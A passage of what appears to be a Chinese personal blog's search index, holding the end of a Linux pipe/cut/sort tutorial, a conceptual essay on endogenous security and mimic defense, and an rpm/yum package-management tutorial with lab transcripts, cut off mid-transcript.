| sort | uniq -c | sort -nr | head -10\n\n\nhistory：列出命令历史记录。\ncut -c 8-：移除每行开头的行号 (通常前 7 字符是行号加空格)。\nsort：按命令名字母排序（为 uniq -c 做准备）。\nuniq -c：统计每个连续出现的命令的次数（排序后连续的相同命令才会被统计）。\nsort -nr：按统计的次数（数值，格式 次数 命令名）降序排序（次数最大的排在最前）。\nhead -10：显示前 10 个结果。\n\n按特定列排序日志：从日志文件中提取第5列（假设是耗时）并按数值降序排，找出耗时最长的请求：\n1grep &quot;Completed&quot; app.log | cut -d&#x27; &#x27; -f 5 | sort -nr | head -1\n\n\ngrep &quot;Completed&quot;：筛选出包含 “Completed” 的行。\ncut -d&#39; &#39; -f 5：提取以空格分隔的第 5 个字段（耗时）。\nsort -nr：按数值降序排序。\nhead -1：显示排在最上面的那个耗时（最大值）。\n\n处理 CSV：提取 CSV 的名字列和销售额列，按销售额降序排：\n1cut -d&#x27;,&#x27; -f 1,4 sales.csv | sort -t&#x27;,&#x27; -k2,2rn\n\n\ncut -d&#39;,&#39; -f 1,4：提取第一列（名字）和第四列（销售额）。\nsort -t&#39;,&#39; -k2,2rn：按第二个字段（销售额）降序排列（数值）。分隔符必须再次指定为逗号 (-t&#39;,&#39;)。\n\n\n\n总结：管道 | 是 Linux&#x2F;Unix 命令行的核心支柱之一，它体现了”组合小工具完成大任务”的哲学。通过它，你可以将多个简单、专注的命令无缝连接起来，构建出高效的数据处理流水线。掌握管道的使用是提升命令行熟练度和解决问题效率的关键步骤。在 2025 年的今天，它依然是系统管理员、开发者和数据科学家的日常必备工具。\ncut: 是你的“纵向剪刀”✂️，专注于提取行中的特定列或字段。记住 -d（分隔符）和 -f（字段编号）是黄金搭档；-c&#x2F;-b 用于直接按位置剪切。\nsort: 是你的“横向排序器”🔃，专注于对整行或基于特定字段对行进行排序。记住 -k（指定排序键）和 -n（数值排序）的威力，-t 用于指定字段分隔符（与 -k 配合），-r 用于倒序。\n黄金组合： 非常自然地在管道 (|) 中连续使用：先 cut 精确定位数据，再 sort 对数据进行排列组合。它们与 grep, uniq, awk, wc 等共同构成了 Unix&#x2F;Linux 文本处理流水线的基石。熟练掌握这两个命令及其组合应用，会让你在命令行下的数据处理能力突飞猛进。\n","slug":"重定向和管道","date":"2025-08-05T09:02:38.000Z","categories_index":"","tags_index":"Linux","author_index":"wyf"},{"id":"c726f3c77c99b3877349dcc73c58eeb4","title":"网络安全","content":"内生安全“内生安全”（Endogenous Security）是一种主动、自适应的网络安全新范式，它强调将安全能力内生于系统和业务本身，而不是作为外部附加的防护层。这一理念由中国工程院院士邬江兴在2015年首次提出，旨在解决传统边界防御模型面对未知攻击（如0day漏洞、APT攻击）时的不足。\n好的，我们来对内生安全进行更深入、更技术性的剖析，尤其聚焦其核心思想、理论基础、关键技术和实现难点。\n内生安全 (Endogenous Security) 的深度解析1.核心理念的再深化：从“附加”到“基因”\n“安全基因”的比喻： 将安全能力比作生物体的“免疫系统”。它不是外敷的膏药，而是深植于“DNA”中的遗传信息。系统从“受精卵”（架构设计）阶段就携带了抵抗威胁的“遗传密码”。\n“结构决定功能”原则： 内生安全坚信，系统的安全属性从根本上由其内在结构、运行机制和交互逻辑决定。通过精心设计这些内在要素，可以“涌现”出强大的、非特异性的安全能力（如自免疫、自恢复、自进化）。\n对抗“未知的未知”： 核心目标是解决传统安全无法应对的利用未知漏洞、未知后门、未知攻击手法（APT， 零日） 的威胁。内生安全追求的是，即使系统内部存在未知缺陷，整体也能保持功能正确和可信。\n\n2.理论基础与科学问题\n动态异构冗余 (DHR - Dynamic Heterogeneous Redundancy)： 这是内生安全最具代表性的理论模型和实现架构（由中国工程院院士邬江兴提出）。其核心原理基于：\n异构性 (Heterogeneity)： 多个功能等效但内部实现（硬件平台、操作系统、应用程序、算法、开发团队&#x2F;语言）完全不同且独立的执行体 (Executors)。攻击者难以找到同时适用于所有异构体的通用攻击载荷。\n冗余性 (Redundancy)： 多个异构执行体并行（或准并行） 处理完全相同的输入。\n动态性 (Dynamicity)： 一个动态调度器 (Dispatcher) 负责分发输入，并接收所有执行体的输出。它基于预设策略（如多数表决、最可信源、专家系统）动态选择输出（通常选择一致或最可信的结果），并将此结果作为系统输出。同时，调度器能动态清洗、重置、重构或替换表现异常（输出不一致）的执行体。\n“相对正确”公理： 在给定相同输入和环境下，功能等效的异构执行体同时产生相同错误输出的概率极低（理论上可无限趋近于零）。这是DHR防御有效性的数学基础。\n“熵不减”定律的工程应用： 通过引入动态性、随机性和不确定性（如随机调度、执行体随机排序、输出裁决逻辑随机化），极大增加了攻击者维持攻击效果、隐藏自身的难度和成本，使得攻击行为本身变得不可持续或极易暴露。\n\n\n非特异性防御机理： DHR不依赖攻击特征库。攻击者要成功：\n必须同时攻破所有（或足够多以影响裁决结果的）异构执行体。\n必须保证所有被攻破的执行体输出完全一致的错误结果（以欺骗裁决器）。\n必须在不被动态调度器检测和清洗的情况下持续保持这种状态。这三个条件同时满足的概率极低，尤其面对未知攻击时。这使得系统具有了内在的、结构化的“基因免疫”能力。\n\n\n\n3.狭义内生安全 (Strict&#x2F;Narrow Endogenous Security)\n核心定义： 特指 基于“动态异构冗余”架构及其衍生技术（如拟态防御） 所实现的安全能力。安全属性源于系统 内在的结构性设计。\n关键特征：\n结构性基因： 安全不是附加功能，而是通过 特定的、创新的系统架构（DHR） 内生的。这种结构本身赋予了系统强大的、非特异的防御能力。\n动态异构冗余 (DHR) 是基石： 这是狭义内生安全的 核心标识 和 理论&#x2F;技术内核。离开了DHR或其核心原理（异构、冗余、动态、裁决），就不能称之为狭义内生安全。\n对抗“未知的未知”： 核心目标是解决利用 未知漏洞、未知后门 的攻击问题，提供 内在的、结构性的容忍能力（即使有缺陷也能正确运行）。\n非特异性防御： 不依赖攻击特征库，防御能力源于架构本身对攻击行为的“熵增”效应和“相对正确”公理。\n自免疫与高可信： 系统具备内在的“免疫力”，能在遭受攻击（包括未知攻击）时保持核心功能的 高可靠性和高可信性。\n\n\n代表性技术&#x2F;实践：\n拟态防御 (Mimic Defense)： DHR架构最著名、最系统的工程实现。\n基于DHR原理设计的拟态路由器、拟态Web服务器、拟态数据库等。\n\n\n范围： 相对聚焦，主要围绕 DHR架构范式 及其直接应用。\n\n总结狭义： 内生安全 ≈ DHR架构范式 ≈ 拟态防御及其核心思想。它强调安全能力必须源于系统内在的、创新的、特定的结构性设计（DHR），这种结构本身能产生强大的、非特异的、对抗未知威胁的防御能力。\n4.广义内生安全 (Broad&#x2F;General Endogenous Security)\n核心定义： 指 将安全能力深度融入信息系统或产品生命周期的各个阶段（设计、开发、构建、运行、演进），使其成为系统自身固有的、内在的、自发的属性 的理念、方法和实践的集合。安全不再是事后附加，而是**“与生俱来”的基因**。\n关键特征：\n安全左移与深度集成： 安全考量始于需求分析和架构设计阶段，贯穿整个开发和运维生命周期（DevSecOps）。\n安全是固有属性： 目标是让安全像系统的功能、性能、可靠性一样，成为其内在的、不可分割的特性。\n方法论与范式： 强调一种构建安全系统的方法论和哲学，而不仅限于某一种具体技术。\n多样化实现路径： 实现“内生安全”可以有多条技术路线，不仅仅依赖DHR。只要能达到“安全内生于系统本身”的目标即可。\n目标导向： 最终目标是获得自免疫、自成长、高可信、高弹性的系统。\n\n\n包含的技术&#x2F;实践 (范围远大于狭义)：\n狭义内生安全 (DHR&#x2F;拟态防御)： 是广义内生安全的一种重要且极具代表性的实现方式。\n安全设计原则： 最小权限、纵深防御、失效安全等原则在架构设计中的应用。\n安全开发实践： 安全编码规范、威胁建模、代码审计、自动化安全测试、软件物料清单 (SBOM)。\n形式化方法： 对关键组件或协议进行形式化规约和验证，确保其逻辑正确性。\n可信计算： 利用硬件信任根 (TPM, TrustZone) 构建可信启动链、内存加密、远程证明。\n零信任架构： 将“永不信任，持续验证”的理念内化为系统的访问控制核心机制。\n安全硬件特性： 利用CPU&#x2F;芯片级的安全特性 (如Intel SGX, AMD SEV, ARM CCA)。\nAI赋能安全： 将AI&#x2F;ML深度集成到系统监测、分析、响应中，实现安全能力的自适应和进化。\n韧性工程： 设计系统具备在遭受攻击或故障时维持核心功能、快速恢复的能力。\n\n\n范围： 非常广泛，涵盖所有致力于将安全内化为系统核心属性而非外部附加物的理念、方法、技术、标准和实践。\n\n总结广义： 内生安全 &#x3D; “安全基因化”的哲学 + 实现该哲学的各种方法。它代表了一种构建安全系统的根本性范式转变：安全能力必须在系统诞生之初就作为核心基因植入，并随着系统生长而生长。DHR&#x2F;拟态防御是这种哲学在对抗未知威胁方面的一个光辉典范和关键技术路径，但不是唯一路径。广义内生安全更强调目标（安全内生化）和理念，而非单一技术。\n5.狭义与广义的关系\n包含关系： 狭义内生安全 (DHR&#x2F;拟态) 是广义内生安全的一个子集，并且是其最具革命性和代表性的子集之一。 可以说，狭义内生安全是广义内生安全理念在解决“未知的未知”威胁问题上的一个巅峰体现。\n核心贡献： 狭义内生安全（特别是DHR理论）的提出和发展，极大地推动和丰富了广义内生安全的内涵，为其提供了强大的理论支撑和实践验证，证明了结构性内生安全对抗高级威胁的可行性。\n目标一致： 无论是狭义还是广义，最终目标都是构建具有内在强大免疫力、高可信、高韧性的信息系统，改变传统外挂式安全的被动局面。\n实现路径： 狭义提供了一条特定的、强有力的路径（DHR）；广义则描绘了一个广阔的愿景和方法论集合，DHR是其中一种（非常重要的）方法，其他方法（如可信计算、安全设计、形式化验证、零信任深度集成等）也贡献于广义内生安全目标的实现。\n\n类比理解\n狭义内生安全 (DHR&#x2F;拟态)： 就像发明了一种全新的 “生物疫苗技术”，这种技术本身利用特定的生物学原理（如mRNA），能够激发人体产生强大的、广谱的免疫力，甚至对抗从未见过的病毒变种。这种技术本身就是内生免疫的一种革命性实现。\n广义内生安全： 则是指 “全面提升生物体自身免疫力” 的整个医学和健康理念。它包括：\n使用上面那种革命性的新疫苗技术。\n改善营养结构（安全设计原则）。\n加强锻炼（安全开发实践、韧性工程）。\n利用基因编辑增强先天免疫（可信计算、安全硬件）。\n建立智能健康监测系统（AI赋能安全）。\n采取主动隔离防护策略（零信任）。\n目标是让生物体自身拥有强大的、内生的抵抗疾病的能力。\n\n\n\n结论\n当讨论 具体的、基于DHR架构的创新防御技术（如拟态防御）及其独特原理（对抗未知漏洞）时，通常指的是 狭义内生安全。\n当讨论 将安全内化为系统基因的总体理念、战略方向和各种实践方法 时，指的是 广义内生安全。狭义内生安全是广义内生安全皇冠上最璀璨的明珠之一，为整个领域树立了标杆。\n\n理解这种区分，有助于更清晰地把握学术讨论、技术文档或政策文件中“内生安全”一词的具体指向。\n6.关键技术实现与深化\n深度异构构造：\n不仅仅是不同品牌的硬件或OS，更深入到指令集架构 (ISA)、编译器链、核心算法实现、随机数生成源、甚至物理层特性的差异。\n如何有效度量和管理异构体的“差异性”和“独立性”是关键挑战。\n\n\n高效动态调度与裁决：\n裁决算法： 从简单多数表决，发展到基于可信度评估、机器学习异常检测、形式化验证结果反馈的智能裁决。\n调度策略： 随机调度、基于性能&#x2F;负载调度、基于历史可信度调度、基于攻击感知的主动调度（如主动轮换、主动清洗）。\n“清洗”技术： 快速重置执行体状态（内存清零、进程重启）、虚拟机&#x2F;容器快照回滚、甚至FPGA动态重配置。需要极低的延迟以避免服务中断。\n\n\n拟态构造工程化： 将DHR理论落地为实际可用的系统架构（拟态防御）。\n拟态边界： 明确界定受DHR保护的资源范围（拟态域）。\n拟态裁决： 高效、可靠的输出一致性比较与选择机制。\n拟态调度： 实现执行体动态迁移、重构、资源管理的核心引擎。\n\n\n形式化方法与可信验证：\n对核心调度逻辑、裁决算法进行形式化建模与验证，证明其安全属性的正确性。\n对关键执行体的功能等效性进行形式化或半形式化验证。\n\n\n内生安全与可信计算的融合：\n利用TPM&#x2F;TCM&#x2F;TrustZone等硬件信任根，确保调度器、裁决器自身代码和配置的完整性、机密性。\n构建从硬件信任根到内生安全架构的可信启动链。\n\n\n智能赋能 (AI&#x2F;ML)：\n增强裁决： 利用ML分析执行体输出模式、资源消耗、时序特性等，更精准识别异常。\n优化调度： AI预测攻击趋势或系统负载，动态调整调度策略和资源分配。\n自动化运维： 自动分析日志，发现潜在脆弱点，辅助执行体版本迭代和配置优化。\n\n\n\n7.内生安全的优势 (与传统安全对比)\n\n\n特征\n传统外挂式安全\n内生安全\n内生安全的优势\n\n\n\n安全基点\n基于已知威胁特征&#x2F;规则\n基于系统内在结构和机制\n能防御未知漏洞、未知攻击 (零日、APT)\n\n\n防御方式\n边界防护、检测响应、事后补救\n结构性免疫、运行中防御、事前融合\n主动防御，降低攻击成功概率\n\n\n防护范围\n点&#x2F;线防御，易被绕过\n面&#x2F;体防御，覆盖系统核心\n防护更全面、更根本\n\n\n安全成本\n叠加式，设备多、运维复杂、效率损\n原生式，降低外设依赖、简化运维\n长期成本更低，系统性能影响更小 (理论上可优化)\n\n\n可信性\n依赖外部设备自身安全\n系统自身具备高可靠、高可信能力\n即使存在未知后门，也能保证功能正确性\n\n\n进化能力\n依赖人工更新规则库&#x2F;特征库\n具备一定自学习、自适应、自成长潜力\n能更好应对威胁环境变化\n\n\n目标\n阻止&#x2F;检测已知攻击\n容忍内部存在缺陷，保证功能可信\n解决“有毒带菌体”难题，实现广义鲁棒控制\n\n\n8.应用场景与实例\n关键信息基础设施： 电力调度控制系统、高铁信号系统、核心路由器&#x2F;交换机、工业控制系统 (DCS&#x2F;SCADA)。在这些领域，系统停摆或功能失效的后果极其严重，内生安全提供高可靠保障。\n云数据中心&#x2F;算力中心： 保护核心虚拟化平台、云管平台、关键业务应用。利用拟态技术构建高安全等级的“云内生安全底座”。\n5G&#x2F;6G 核心网： 保障网络切片安全、用户面&#x2F;控制面安全。\n自动驾驶&#x2F;车联网： 保护车载核心控制系统 (ECU)、V2X通信安全，防止车辆被远程劫持。\n高价值数据平台： 保护核心数据库、大数据分析平台。\n实例： 中国已在多个国家级关键系统中部署拟态防御设备，如拟态路由器、拟态Web服务器、拟态数据库等，并公开报道成功抵御了多次高级别网络攻击（包括利用未知漏洞的攻击）。\n\n9.面临的挑战与未来方向\n设计复杂性： 构建深度异构、高效调度的系统架构非常复杂，设计和验证成本高。\n性能开销： 并行执行、裁决、动态调度会带来额外的计算和通信开销（尽管可通过硬件加速、优化算法缓解）。\n等效性验证： 严格验证不同异构执行体的功能等效性非常困难。\n生态成熟度： 内生安全硬件&#x2F;软件生态仍在发展中，标准化、互操作性有待提高。\n调度与裁决策略的智能化： 如何设计更智能、更高效的调度和裁决算法是持续挑战。\n形式化验证的规模化： 将形式化方法大规模应用于复杂内生安全系统的验证尚存难度。\n成本与推广： 初期成本相对较高，需要更广泛的应用来降低成本并推广普及。\n新型攻击研究： 攻击者也在研究针对内生安全机制的新攻击方法（如侧信道攻击、对调度器的攻击），需要持续研究和防御。\n\n总结升华：内生安全不仅仅是一种技术，更是一种网络安全范式的革命性转变。它跳出了传统“封堵查杀”的被动循环，从信息系统的生命本源（架构设计） 入手，通过创新的动态异构冗余 (DHR) 等理论和结构，赋予系统与生俱来的“自免疫”和“高可信”能力。其核心价值在于能够有效防御利用系统内部未知缺陷（漏洞、后门）的攻击，为关键基础设施和数字化社会的安全提供了全新的、更具根本性的解决方案。\n尽管面临设计复杂性、性能开销、生态成熟度等挑战，内生安全代表了网络安全发展的战略方向。随着理论研究的深入、工程技术的突破、计算硬件的进步以及AI的赋能，内生安全将不断成熟和完善，成为构建未来高可信、高弹性网络空间的基石技术。它不仅是技术创新的高地，更是国家网络空间安全保障能力的关键支撑点。\n","slug":"网络安全","date":"2025-08-05T02:46:41.000Z","categories_index":"","tags_index":"安全","author_index":"wyf"},{"id":"038cf21747c752d3879fd94ed29a8aac","title":"软件管理","content":"RPM以下是关于 Linux rpm 命令的详细介绍，涵盖其核心概念、主要功能、常用命令及示例：\n一、rpm 是什么？\n全称：Red Hat Package Manager（红帽包管理器）\n作用：底层包管理工具，用于安装、查询、更新、卸载 .rpm 格式的软件包。\n适用系统：Red Hat、CentOS、Fedora、OpenSUSE 等基于 RPM 的发行版。\n特点：\n直接操作软件包文件（.rpm），不自动解决依赖（需手动处理）。\n数据库记录：安装信息存储在 /var/lib/rpm 中。\n\n\n\n二、rpm 核心功能与语法命令格式：1rpm [选项] [操作] [包名/文件名]\n\n\n\n\n操作模式\n功能说明\n\n\n\n安装&#x2F;升级\n-i, -U, -F\n\n\n查询\n-q\n\n\n验证\n-V\n\n\n卸载\n-e\n\n\n校验签名\n--checksig\n\n\n重建数据库\n--rebuilddb\n\n\n12# 包名示例mysql-community=common-5.7.12-1.el7.x86_64.rpm\n\n mysql-community&#x3D;common \n软件包名：mysql \n5.7.12-1：版本号  \nGPL协议 \n每个软件的版本号都是开发者自己定的 \n发布版本：el7 \nrhel 7  centos7 \nrpm:为了让开发者和使用者交流\n三、常用操作详解1. 安装软件包1rpm -ivh 包名.rpm\n\n\n选项说明：\n\n-i：安装（Install）\n-v：显示详细信息（Verbose）\n-h：显示进度条（Hash marks）\n\n\n示例：\n1rpm -ivh nginx-1.18.0.rpm\n\n2. 升级软件包12rpm -Uvh 包名.rpm   # 升级或安装（如未安装）rpm -Fvh 包名.rpm   # 仅当旧版已存在时升级\n\n3. 卸载软件包1rpm -e 包名\n\n\n示例：\n1rpm -e nginx\n\n4. 查询操作（最常用）1rpm -q [选项] [包名/文件]\n\n\n常用查询选项：\n\n\n\n选项\n说明\n\n\n\n-qa\n查询所有已安装包\n\n\n-qi 包名\n显示包的详细信息\n\n\n-ql 包名\n列出包安装的文件\n\n\n-qf 文件名\n查询文件属于哪个包\n\n\n-qc 包名\n列出包的配置文件\n\n\n-qd 包名\n列出包的文档文件\n\n\n--scripts 包名\n查看包包含的脚本（如安装&#x2F;卸载前&#x2F;后脚本）\n\n\n\n示例：\n123rpm -qa | grep httpd      # 查找所有含 &quot;httpd&quot; 的包rpm -qi bash              # 查看 bash 包的版本、作者等信息rpm -qf /bin/ls           # 查询 ls 命令属于哪个包\n\n5. 验证软件包完整性12rpm --checksig 包名.rpm    # 校验数字签名rpm -V 包名               # 验证已安装包的文件是否被篡改\n\n\n输出说明： S（大小）、M（权限）、5（MD5）、L（链接路径）等变化标志。\n\n6. 解决依赖问题\nrpm 不自动解决依赖，需手动安装所有依赖包。\n推荐使用高层工具（如 yum&#x2F;dnf）自动处理依赖。\n\n四、高级用法1. 重建 RPM 数据库（当数据库损坏时）12rpm --rebuilddb      # 重建整个数据库rpm --verifydb       # 验证数据库一致性\n\n2. 强制安装（慎用！）12rpm -ivh --force 包名.rpm   # 覆盖文件/忽略依赖rpm -ivh --nodeps 包名.rpm  # 忽略依赖检查（可能报错）\n\n3. 提取 RPM 包内文件1rpm2cpio 包名.rpm | cpio -idmv  # 解压 .rpm 到当前目录\n\n五、重要注意事项\n依赖问题：rpm 不能自动解决依赖，需按顺序手动安装所有依赖包。\n数据库锁定：运行时数据库被锁定，避免多个 rpm 命令同时操作。\n签名校验：安装前务必检查 GPG 签名（rpm --import RPM-GPG-KEY-xxx 导入密钥）。\n优先使用 yum&#x2F;dnf：日常管理推荐使用 yum 或 dnf（自动处理依赖、下载包）。\n\n示例综合场景场景：安装并验证 Nginx1234567891011121314# 1. 下载包wget http://example.com/nginx-1.18.0.rpm# 2. 校验签名rpm --checksig nginx-1.18.0.rpm# 3. 安装rpm -ivh nginx-1.18.0.rpm# 4. 查询安装文件rpm -ql nginx# 5. 验证配置是否被修改rpm -V nginx\n\n总结\nrpm 是 RPM 发行版的底层包管理工具，适合精确控制软件包。\n掌握 查询（-q）、安装（-i）、卸载（-e）、验证（-V） 四大核心操作。\n生产环境建议搭配 yum/dnf 使用，避免手动处理依赖问题。\n\nYUM一、 什么是 Yum？\n全称： Yellowdog Updater, Modified。\n核心功能： 是一个在 RHEL（Red Hat Enterprise Linux）及其衍生发行版（如 CentOS, Fedora（旧版）, Rocky Linux, AlmaLinux 等） 上使用的高级包管理器。\n主要职责： 用于安装、更新、删除、查询和管理来自软件仓库的 RPM 软件包。\n关键优势： 自动处理依赖关系。这是它最强大、最受欢迎的特性。当你安装一个软件包时，yum 会自动计算并下载安装该软件包正常运行所需的所有其他软件包（依赖包）。\n工作基础： 依赖于配置好的软件仓库。仓库是集中存放 RPM 软件包及其元数据（如依赖关系、描述、版本信息等）的服务器或目录。\n后继者： 在较新的 Fedora、RHEL 8+、CentOS Stream 8+、Rocky Linux 8+、AlmaLinux 8+ 等系统中，dnf (Dandified Yum) 已经成为默认的包管理器，它是 yum 的现代化替代品，兼容大部分 yum 命令语法，但速度更快、依赖解析更健壮、API 更好。不过 yum 命令通常作为 dnf 的兼容性别名保留。\n\n二、 为什么需要 Yum？\n简化软件管理： 手动下载 RPM 包并处理复杂的依赖关系链极其繁琐且容易出错。Yum 自动化了这个过程。\n集中化更新： 从一个或多个配置好的仓库获取安全更新、错误修复和新功能软件包。\n系统一致性： 确保安装的软件来自受信任的来源，并且版本兼容。\n高效查询： 快速查找系统上已安装的软件或仓库中可用的软件。\n\n三、 Yum 的核心概念\nRPM： 软件包本身的格式。Yum 管理的是 RPM 包。\n仓库： 软件包的来源。系统配置文件定义了仓库的位置和访问方式（如 /etc/yum.repos.d/ 目录下的 .repo 文件）。\n元数据： 仓库中关于软件包集合的信息（包列表、依赖关系、文件列表等）。Yum 需要定期下载元数据（通过 yum makecache 或任何操作触发）才能知道仓库里有什么以及如何处理依赖。\n事务： Yum 的操作（如安装、更新一组包）是事务性的。它会先计算所有需要做的更改（包含依赖关系），让你确认，然后才执行。如果执行过程中出错，它会尽量回滚到之前的状态（虽然并非总能完美回滚）。\n\n四、 常用 Yum 命令详解命令语法通常为：yum [options] [command] [package_name...]\n\n安装软件包：\n\nyum install package_name\n安装指定的软件包及其所有依赖。\n示例：yum install httpd (安装 Apache web 服务器)\n\n\nyum install package_name.rpm (从本地文件安装，但仍会尝试从仓库解决依赖)\nyum install /path/to/package_name.rpm (同上，指定完整路径)\n\n\n更新软件包：\n\nyum update\n更新所有已安装且有可用更新的软件包及其依赖。\n(重要) 这是应用安全补丁和错误修复的主要方式。定期运行 yum update 对于系统安全至关重要。\n\n\nyum update package_name\n仅更新指定的软件包及其依赖（如果需要）。\n示例：yum update kernel (仅更新内核)\n\n\nyum --security update 或 yum update --security\n仅安装标记为安全更新的包。非常实用，专注于关键修复。\n\n\n\n\n移除软件包：\n\nyum remove package_name\n移除指定的软件包，并尝试移除那些仅由该包依赖且不再需要的包。\n示例：yum remove nano (移除 nano 文本编辑器)\n\n\nyum autoremove\n移除最初作为依赖安装但现在不再被任何已安装软件包需要的“孤儿”包。清理空间的好方法。\n\n\n\n\n搜索软件包：\n\nyum search keyword\n在所有启用的仓库中，搜索包名、描述等信息包含指定关键字的软件包。\n示例：yum search text editor (查找文本编辑器)\n\n\nyum provides */filename 或 yum whatprovides */filename\n查找哪个软件包提供了特定的文件或命令。\n示例：yum provides */ifconfig (查找提供 ifconfig 命令的包，通常是 net-tools)\n\n\nyum list [keyword]\n列出软件包。\nyum list：列出所有已安装和仓库中可用的包（输出很长）。\nyum list installed：仅列出已安装的包。\nyum list available：仅列出仓库中可用但尚未安装的包。\nyum list updates：列出所有有可用更新的已安装包。\nyum list extras：列出不是从任何当前配置的仓库安装的包（可能是手动安装的 RPM）。\nyum list obsoletes：列出被仓库中其他包标记为废弃的已安装包。\nyum list kernel：列出所有内核包（已安装和可用的）。\n\n\n\n\n\n\n查看软件包信息：\n\nyum info package_name\n显示指定软件包的详细信息，包括版本、发布、大小、仓库来源、描述、URL 等。\n示例：yum info nginx\n\n\n\n\n清理缓存：\n\nyum clean all\n强力清理：删除所有下载的包文件和元数据缓存。下次操作时需要重新下载元数据。当仓库信息过时或损坏时常用。\n\n\nyum clean packages\n删除缓存的 RPM 包文件（通常位于 /var/cache/yum/）。\n\n\nyum clean metadata\n删除下载的仓库元数据（下次操作会重新下载）。\n\n\nyum clean expire-cache\n让本地缓存的元数据过期，强制 yum 下次操作时检查远程仓库是否有更新。\n\n\n\n\n管理仓库：\n\nyum repolist [all|enabled|disabled]\n列出所有仓库的状态。\nyum repolist：列出所有启用的仓库。\nyum repolist all：列出所有配置的仓库（启用的和禁用的）。\n\n\n\n\nyum-config-manager (通常需要安装 yum-utils)\n一个更强大的工具，用于启用&#x2F;禁用仓库、添加新仓库等。\n示例：\nyum-config-manager --enable epel (启用 EPEL 仓库)\nyum-config-manager --add-repo=http://example.com/repo/repo.repo (添加一个新仓库)\n\n\n\n\n手动配置： 仓库配置文件在 /etc/yum.repos.d/ 目录下，以 .repo 结尾。可以手动编辑这些文件来添加、删除或修改仓库设置。\n\n\n查看历史：\n\nyum history\n查看 yum 操作的历史记录（事务 ID、日期、操作、改变包数）。\n\n\nyum history info [transaction_id]\n查看特定事务 ID 的详细信息（安装了哪些包，更新了哪些包等）。\n\n\nyum history undo [transaction_id]\n尝试撤销指定事务 ID 所做的更改（效果类似回滚，但依赖关系变化可能导致不完全准确）。\n\n\nyum history redo [transaction_id]\n重新执行指定事务 ID 的操作。\n\n\n\n\n检查依赖问题：\n\nyum check\n检查本地 RPM 数据库是否存在依赖性问题。\n\n\nyum deplist package_name\n列出指定包的依赖关系树（它依赖什么，什么依赖它）。\n\n\n\n\n\n五、 重要选项\n-y &#x2F; --assumeyes：对所有交互式提问自动回答 “yes”。在脚本中非常有用，但使用时要极其小心，避免误操作！\n示例：yum -y update (自动确认所有更新)\n\n\n--nogpgcheck：禁用 RPM 包的 GPG 签名验证。存在安全风险，仅在绝对信任来源且必要时使用。\n-q &#x2F; --quiet：安静模式，减少输出。\n-v &#x2F; --verbose：详细模式，增加输出信息。\n--enablerepo=repoid：临时启用指定的仓库（覆盖配置）。\n--disablerepo=repoid：临时禁用指定的仓库（覆盖配置）。\n\n六、 常用第三方仓库\nEPEL： Extra Packages for Enterprise Linux。为 RHEL&#x2F;CentOS 等提供大量额外的高质量软件包。几乎是标配。\nRPM Fusion： 提供 Fedora&#x2F;RHEL 因许可证或策略原因未包含的软件（如多媒体编解码器、显卡驱动等）。分 free 和 nonfree。\nRemi： 提供更新版本的 PHP、MySQL&#x2F;MariaDB 等软件，常用于需要较新环境的应用。\n\n七、 最佳实践与注意事项\n定期更新： sudo yum update 是维护系统安全和稳定性的基石。建立更新计划。\n使用 sudo： 大多数 yum 操作需要 root 权限，使用 sudo 执行。\n理解操作： 在执行 yum update 或 yum remove 等重大操作前，务必仔细查看 yum 列出将要安装&#x2F;更新&#x2F;移除的包列表，确认无误后再输入 y。\n谨慎使用 -y： 自动化脚本中很有用，但手动操作时避免使用，给自己一个检查的机会。\n管理仓库： 只添加必要且受信任的仓库。来源不明的仓库可能带来安全风险或兼容性问题。了解如何启用&#x2F;禁用仓库。\n利用历史： yum history 是排查问题和尝试回滚的有力工具。\n清理缓存： 定期 yum clean all 或 yum clean packages 可以释放 /var/cache/yum/ 下的磁盘空间。\n向 DNF 过渡： 如果你使用的是 RHEL 8+ 或 Fedora 22+，积极学习和使用 dnf。命令高度兼容（yum 通常是 dnf 的符号链接），但 dnf 是未来。\n安全更新： 优先使用 yum --security update 来应用关键安全补丁。\n阅读输出信息： Yum 的输出信息（尤其是 Transaction Summary）包含了关键的操作细节，养成阅读习惯。\n\n八、实验1.使用yum卸载vim123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354[root@wyf 桌面]# yum provides vim                         #查看已安装的vim版本上次元数据过期检查：0:00:20 前，执行于 2025年08月05日 星期二 16时52分02秒。vim-enhanced-2:8.0.1763-13.el8.x86_64 : A version of the VIM editor which                                      : includes recent enhancements仓库        ：@System匹配来源：提供    : vim = 8.0.1763-13.el8vim-enhanced-2:8.0.1763-16.el8.x86_64 : A version of the VIM editor which                                      : includes recent enhancements仓库        ：AppStream匹配来源：提供    : vim = 8.0.1763-16.el8[root@wyf 桌面]# yum remove vim-enhanced-2:8.0.1763-13.el8.x86_64    #yum卸载vim依赖关系解决。=============================================================================== 软件包            架构        版本                      仓库             大小===============================================================================移除: vim-enhanced      x86_64      2:8.0.1763-13.el8         @AppStream      3.4 M清除未被使用的依赖关系: gpm-libs          x86_64      1.20.7-15.el8             @AppStream       30 k vim-common        x86_64      2:8.0.1763-13.el8         @AppStream       27 M事务概要===============================================================================移除  3 软件包将会释放空间：30 M确定吗？[y/N]： y运行事务检查事务检查成功。运行事务测试事务测试成功。运行事务  准备中  :                                                                1/1   删除    : vim-enhanced-2:8.0.1763-13.el8.x86_64                          1/3   删除    : gpm-libs-1.20.7-15.el8.x86_64                                  2/3   运行脚本: gpm-libs-1.20.7-15.el8.x86_64                                  2/3   删除    : vim-common-2:8.0.1763-13.el8.x86_64                            3/3   运行脚本: vim-common-2:8.0.1763-13.el8.x86_64                            3/3   验证    : gpm-libs-1.20.7-15.el8.x86_64                                  1/3   验证    : vim-common-2:8.0.1763-13.el8.x86_64                            2/3   验证    : vim-enhanced-2:8.0.1763-13.el8.x86_64                          3/3 已移除:  vim-enhanced-2:8.0.1763-13.el8.x86_64      gpm-libs-1.20.7-15.el8.x86_64       vim-common-2:8.0.1763-13.el8.x86_64       完毕！[root@wyf 桌面]# vim 1.txt   bash: vim: 未找到命令...                                #由于已经卸载了vim，执行不了命令文件搜索失败: Cannot update read-only repo\n\n2.使用yum安装vim123456789101112131415161718192021222324252627282930313233343536373839404142434445464748[root@wyf 桌面]# yum install vim上次元数据过期检查：0:03:54 前，执行于 2025年08月05日 星期二 16时52分02秒。依赖关系解决。=============================================================================== 软件包             架构         版本                    仓库             大小===============================================================================安装: vim-enhanced       x86_64       2:8.0.1763-16.el8       AppStream       1.4 M安装依赖关系: gpm-libs           x86_64       1.20.7-17.el8           AppStream        39 k vim-common         x86_64       2:8.0.1763-16.el8       AppStream       6.3 M事务概要===============================================================================安装  3 软件包总下载：7.7 M安装大小：30 